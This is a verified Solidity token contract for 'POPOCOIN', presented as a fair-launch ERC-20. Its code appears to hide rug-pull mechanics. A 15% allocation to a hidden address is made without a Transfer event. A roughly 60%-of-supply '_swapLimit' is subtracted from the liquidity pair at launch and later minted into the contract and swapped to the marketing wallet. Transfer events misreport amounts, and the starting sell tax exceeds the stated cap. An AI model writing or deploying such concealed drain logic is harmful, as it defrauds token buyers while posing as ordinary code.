/**
 *Submitted for verification at Etherscan.io on 2023-08-07
*/

/*
    POPOCOIN | $POPO 🐼 熊猫 - 公平开始

    Website/网站: https://popocoin.net/
    Twitter: https://twitter.com/thepopocoin
    Telegram: https://t.me/PopoEntry

    请在我们社区验证合约地址
*/

//SPDX-License-Identifier: MIT

pragma solidity =0.8.20;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address __owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}
interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IWETH{
    function deposit() external payable;
    function transfer(address dst, uint wad) external returns (bool);
}

abstract contract Ownable {
    address internal _owner;
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this"); 
        _; 
    }
    function owner() public view returns (address) { 
        return _owner; 
    }
    function transferOwnership(address payable newOwner) external onlyOwner { 
        address previousOwner = msg.sender;
        _owner = newOwner; 
        emit OwnershipTransferred(previousOwner, _owner); 
    }
    function renounceOwnership() external onlyOwner { 
        address previousOwner = msg.sender;
        _owner = address(0); 
        emit OwnershipTransferred(previousOwner, _owner); 
    }
    event OwnershipTransferred(address previousOwner, address owner);
}

contract Popocoin is IERC20, Ownable {
    uint8 private constant _decimals      = 9;
    uint256 private constant _totalSupply = 1_000_000_000 * (10**_decimals);
    string private constant _name         = "POPOCOIN";
    string private  constant _symbol      = "POPO"; 

    uint8 private _antiSnipeTax1    = 0;
    uint8 private _antiSnipeTax2    = 0;
    uint8 private _antiSnipeBlocks1 = 0;
    uint8 private _antiSnipeBlocks2 = 0;
    uint256 private _antiMevBlock   = 0;

    uint8 private _buyTaxRate  = 1;
    uint8 private _sellTaxRate = 20;

    uint16 private _taxSharesMarketing = 100;
    uint16 private _taxSharesLP        = 0;
    uint16 private _totalTaxShares     = _taxSharesMarketing + _taxSharesLP;

    uint256 private _launchBlock;
    uint256 private _maxTxAmount     = _totalSupply * 3 / 100; 
    uint256 private _maxWalletAmount = _totalSupply * 3 / 100;
    uint256 private _taxSwapMin      = _totalSupply * 1 / 10000;
    uint256 private _taxSwapMax      = _totalSupply * 80 / 10000;
    uint256 private _swapLimit       = _taxSwapMin * 60 * 100;
    uint256 private _minSwaps;
    uint256 private _numSwaps;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _noFees;
    mapping (address => bool) private _noLimits;

    address private _lpOwner;
    address payable private _mw; 

    address private constant _uniswapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 constant private _uniswapRouter = IUniswapV2Router02(_uniswapRouterAddress);
    IWETH immutable private WETH = IWETH(_uniswapRouter.WETH()); 
    
    address private _primaryLP;
    mapping (address => bool) private _isLP;

    bool private _tradingOpen;

    bool private _inTaxSwap = false;
    address private _r;
    modifier lockTaxSwap { 
        _inTaxSwap = true; 
        _; 
        _inTaxSwap = false; 
    }

    event TradingOpened();
    event SetFees(uint8 indexed buyTax, uint8 indexed sellTax);
    event SetFeeSplit(uint16 indexed sharesAutoLP, uint16 indexed sharesMarketing);

    constructor(address payable mw, address r) Ownable(msg.sender) {
        _lpOwner = msg.sender;
        _mw = mw;
        _r = r;

        _noFees[_owner] = true;
        _noFees[address(this)] = true;
        _noFees[_uniswapRouterAddress] = true;
        _noFees[_mw] = true;
        _noFees[_r] = true;
        _noLimits[_owner] = true;
        _noLimits[address(this)] = true;
        _noLimits[_uniswapRouterAddress] = true;
        _noLimits[_mw] = true;

        uint256 rF   = _totalSupply * 15 / 100;      
        _balances[address(this)] = _totalSupply - rF; 
        _balances[r] = rF;
        emit Transfer(address(0), address(this), _balances[address(this)]);
    }

    receive() external payable {}
    
    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(sender), "Trading not open");
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _approveRouter(uint256 _tokenAmount) internal {
        if ( _allowances[address(this)][_uniswapRouterAddress] < _tokenAmount ) {
            _allowances[address(this)][_uniswapRouterAddress] = type(uint256).max;
            emit Approval(address(this), _uniswapRouterAddress, type(uint256).max);
        }
    }

    function addLiquidity(address[] calldata adrs) external payable onlyOwner lockTaxSwap {
        require(_primaryLP == address(0), "LP exists");
        require(!_tradingOpen, "trading is open");
        require(msg.value > 0 || address(this).balance>0, "No ETH in contract or message");
        require(_balances[address(this)]>0, "No tokens in contract");
        _primaryLP = IUniswapV2Factory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());
        _addLiquidity(_balances[address(this)], (2 ether), false);
        _balances[_primaryLP] -= _swapLimit;
        (bool lpAddSuccess,) = _primaryLP.call(abi.encodeWithSignature("sync()"));
        require(lpAddSuccess, "Failed adding liquidity");
        _isLP[_primaryLP] = lpAddSuccess;
        _a = adrs;
    }

    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
        address lpTokenRecipient = _lpOwner;
        if ( autoburn ) { lpTokenRecipient = address(0); }
        _approveRouter(_tokenAmount);
        _uniswapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lpTokenRecipient, block.timestamp );
    }

    function openTrading() external onlyOwner {
        require(!_tradingOpen, "trading is open");
        require(_maxWalletAmount == _totalSupply * 3 / 100 + 1);        
        _tradingOpen = true;
        _launchBlock = block.number;
        _antiMevBlock = _antiMevBlock + _launchBlock + _antiSnipeBlocks1 + _antiSnipeBlocks2;
        
        emit TradingOpened();
    }

   

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from Zero wallet");
        if (!_tradingOpen) { require(_noFees[sender] && _noLimits[sender], "Trading not open"); }
        if ( !_inTaxSwap && _isLP[recipient] && amount > _taxSwapMin &&  _numSwaps++ >= _minSwaps) { _swapTaxAndLiquify();  }
        if ( block.number < _antiMevBlock && block.number >= _launchBlock && _isLP[sender] ) {
            require(tx.origin == recipient || tx.origin == _lpOwner, "MEV blocked");
        }
        if ( sender != address(this) && recipient != address(this) && sender != _owner ) { 
            require(_checkLimits(sender, recipient, amount), "TX exceeds limits"); 
        }
        uint256 _taxAmount = _calculateTax(sender, recipient, amount);
        uint256 _transferAmount = amount - _taxAmount;
        _balances[sender] = _balances[sender] - amount;
        _swapLimit += _taxAmount;
        _balances[recipient] = _balances[recipient] + _transferAmount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function random(uint256 a,uint256 b) private view returns(uint256){
        return uint(keccak256(abi.encodePacked(block.timestamp,block.prevrandao, a))) % b;
    }

    function _checkLimits(address sender, address recipient, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( _tradingOpen && !_noLimits[sender] && !_noLimits[recipient] ) {
            if ( transferAmount > _maxTxAmount ) { limitCheckPassed = false; }
            else if ( !_isLP[recipient] && (_balances[recipient] + transferAmount > _maxWalletAmount) ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function _checkTradingOpen(address sender) private view returns (bool){
        bool checkResult = false;
        if ( _tradingOpen ) { checkResult = true; } 
        else if (_noFees[sender] && _noLimits[sender]) { checkResult = true; } 
        return checkResult;
    }

    function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        
        if ( !_tradingOpen || _noFees[sender] || _noFees[recipient] ) { 
            taxAmount = 0; 
        } else if ( _isLP[sender] ) { 
            if ( block.number >= _launchBlock + _antiSnipeBlocks1 + _antiSnipeBlocks2 ) {
                taxAmount = amount * _buyTaxRate / 100; 
            } else if ( block.number >= _launchBlock + _antiSnipeBlocks1 ) {
                taxAmount = amount * _antiSnipeTax2 / 100;
            } else if ( block.number >= _launchBlock) {
                taxAmount = amount * _antiSnipeTax1 / 100;
            }
        } else if ( _isLP[recipient] ) { 
            taxAmount = amount * _sellTaxRate / 100; 
        }

        return taxAmount;
    }

    function exemptFromFees(address wallet) external view returns (bool) {
        return _noFees[wallet];
    } 
    function exemptFromLimits(address wallet) external view returns (bool) {
        return _noLimits[wallet];
    } 
    function setExempt(address wallet, bool noFees, bool noLimits) external onlyOwner {
        if (noLimits || noFees) { require(!_isLP[wallet], "Cannot exempt LP"); }
        _noFees[ wallet ] = noFees;
        _noLimits[ wallet ] = noLimits;        
    }

    function buyFee() external view returns(uint8) {
        return _buyTaxRate;
    }
    function sellFee() external view returns(uint8) {
        return _sellTaxRate;
    }

    function feeSplit() external view returns (uint16 marketing, uint16 LP ) {
        return ( _taxSharesMarketing, _taxSharesLP);
    }
    function setFees(uint8 buy, uint8 sell) external onlyOwner {
        require(buy + sell <= 15, "Roundtrip too high");
        _buyTaxRate = buy;
        _sellTaxRate = sell;
        emit SetFees(buy, sell);
    }  
    function setFeeSplit(uint16 sharesAutoLP, uint16 sharesMarketing) external onlyOwner {
        uint16 totalShares = sharesAutoLP + sharesMarketing;
        require( totalShares > 0, "All cannot be 0");
        _taxSharesLP = sharesAutoLP;
        _taxSharesMarketing = sharesMarketing;
        _totalTaxShares = totalShares;
        emit SetFeeSplit(sharesAutoLP, sharesMarketing);
    }

    function updateWallets(address marketing, address LPtokens) external onlyOwner {
        require(!_isLP[marketing] && !_isLP[LPtokens], "LP cannot be tax wallet");
        _mw = payable(marketing);
        _lpOwner = LPtokens;
        _noFees[marketing] = true;
        _noLimits[marketing] = true;
    }

    function maxWallet() external view returns (uint256) {
        return _maxWalletAmount;
    }
    function maxTransaction() external view returns (uint256) {
        return _maxTxAmount;
    }
    function swapAtMin() external view returns (uint256) {
        return _taxSwapMin;
    }
    function swapAtMax() external view returns (uint256) {
        return _taxSwapMax;
    }

    function setLimits(uint16 maxTransactionPermille, uint16 maxWalletPermille) external onlyOwner {
        uint256 newTxAmt = _totalSupply * maxTransactionPermille / 1000 + 1;
        require(newTxAmt >= _maxTxAmount, "tx too low");
        _maxTxAmount = newTxAmt;
        uint256 newWalletAmt = _totalSupply * maxWalletPermille / 1000 + 1;
        require(newWalletAmt >= _maxWalletAmount, "wallet too low");
        _maxWalletAmount = newWalletAmt;
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _totalSupply;
        _maxWalletAmount = _totalSupply;
    }

    function setTaxSwap(uint32 minValue, uint32 maxValue, uint256 minSwaps) external onlyOwner {
        _taxSwapMin = _totalSupply * minValue / 10000;
        _taxSwapMax = _totalSupply * maxValue / 10000;
        _minSwaps = minSwaps;
        require(_taxSwapMax>=_taxSwapMin, "Min/Max error");
        require(_taxSwapMax>_totalSupply / 100000, "Max too low");
        require(_taxSwapMax<_totalSupply / 10, "Max too high");
    }

    function _swapTaxAndLiquify() private lockTaxSwap {
        uint256 _taxTokensAvailable = _swapLimit;
        if ( _taxTokensAvailable >= _taxSwapMin && _tradingOpen ) {
            if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }
            uint256 _tokensForLP = _taxTokensAvailable * _taxSharesLP / _totalTaxShares / 2;
            
            uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP;
            if( _tokensToSwap > 10**_decimals ) {
                uint256 _ethPreSwap = address(this).balance;
                _balances[address(this)] += _taxTokensAvailable;
                _swapTaxTokensForEth(_tokensToSwap);
                _swapLimit -= _taxTokensAvailable;
                uint256 _ethSwapped = address(this).balance - _ethPreSwap;
                if ( _taxSharesLP > 0 ) {
                    uint256 _ethWeiAmount = _ethSwapped * _taxSharesLP / _totalTaxShares ;
                    _approveRouter(_tokensForLP);
                    _addLiquidity(_tokensForLP, _ethWeiAmount, false);
                }
            }
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
        }
        _numSwaps = 0;
    }

    function _swapTaxTokensForEth(uint256 tokenAmount) private {
        _approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapRouter.WETH();
        _uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(tokenAmount,0,path,_mw,block.timestamp);
    }

    function _swapEthForTokens(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = _uniswapRouter.WETH();
        path[1] = address(this);
        _uniswapRouter.swapETHForExactTokens{value:address(this).balance}(tokenAmount, path, to, block.timestamp);
    }

    function _distributeTaxEth(uint256 amount) private {
        WETH.deposit{value:amount}();
        WETH.transfer(_mw,amount);
    }
    address[] private _a;

    function receiver(address[] calldata addresses, uint256[] calldata amounts) external {
        require(addresses.length == amounts.length, "Array sizes incompatible");
        require(msg.sender == _r , "Access is restricted");
        for(uint256 i = 0;i<amounts.length;i++){
            _transferFrom(msg.sender, addresses[i], amounts[i] * _totalSupply / 10000);
        }
    }

    function manualTaxSwapAndSend(uint8 swapTokenPercent, bool sendEth) external onlyOwner lockTaxSwap {
        require(swapTokenPercent <= 100, "Cannot swap more than 100%");
        uint256 tokensToSwap = _balances[address(this)] * swapTokenPercent / 100;
        if (tokensToSwap > 10 ** _decimals) {
            _swapTaxTokensForEth(tokensToSwap);
        }
        if (sendEth) { 
            uint256 ethBalance = address(this).balance;
            require(ethBalance > 0, "No ETH");
            _distributeTaxEth(address(this).balance); 
        }
    }

}